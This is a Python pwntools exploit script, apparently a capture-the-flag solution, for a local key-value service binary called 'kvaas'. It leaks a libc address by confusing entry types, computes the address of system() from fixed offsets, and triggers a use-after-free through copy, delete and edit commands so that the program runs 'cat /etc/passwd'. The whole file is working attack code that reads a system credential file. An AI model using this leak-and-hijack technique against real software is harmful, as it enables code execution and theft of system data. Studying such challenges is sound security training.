#!/usr/bin/env python3

import pwn

conn = pwn.process(["../challenge/src/kvaas"])

# Relative addresses
SYSTEM_ADDR = 0x7f72a6b38ff0
GMTIME_ADDR = 0x7f72a6ba8b50


def recv_prompt():
    return conn.recvuntil('command> ')

def leak_libc_time_addr():
    recv_prompt()
    conn.sendline('add')
    conn.sendline('t')
    conn.sendline('time')
    recv_prompt()
    conn.sendline('delete')
    conn.sendline('t')
    recv_prompt()
    conn.sendline('add')
    conn.sendline('u')
    conn.sendline('uint')
    conn.sendline('-1')
    conn.sendline('list')
    recv_prompt()
    top = conn.recvline().decode('utf-8')
    print(top)
    addr = int(top.split(':')[1].strip(), 10)
    print('LIBC gmtime @ 0x{:016x}'.format(addr))
    return addr

def try_calling_system(system_addr):
    """Now try calling system."""
    # create secret
    conn.sendline('add')
    conn.sendline('c1')
    conn.sendline('sec')
    conn.sendline('foo')
    conn.sendline('bar')
    # make copy for uaf
    conn.sendline('copy')
    conn.sendline('c1')
    conn.sendline('c2')
    # delete to free
    conn.sendline('delete')
    conn.sendline('c2')
    # add to fill
    conn.sendline('add')
    conn.sendline('c3')
    conn.sendline('uint')
    conn.sendline('foo')
    # add to use freed
    conn.sendline('add')
    conn.sendline('c4')
    conn.sendline('uint')
    conn.sendline('{}'.format(system_addr))
    # trigger UAF
    conn.sendline('edit')
    conn.sendline('c1')
    conn.sendline('cat /etc/passwd')
    conn.sendline('barbarbarbarbarbar')


time_addr = leak_libc_time_addr()
system_addr = time_addr - GMTIME_ADDR + SYSTEM_ADDR
print('I think system is @ 0x{:08x}'.format(system_addr))
try_calling_system(system_addr)
a = True
while a:
    a = conn.recv(timeout=2)
    print(a)
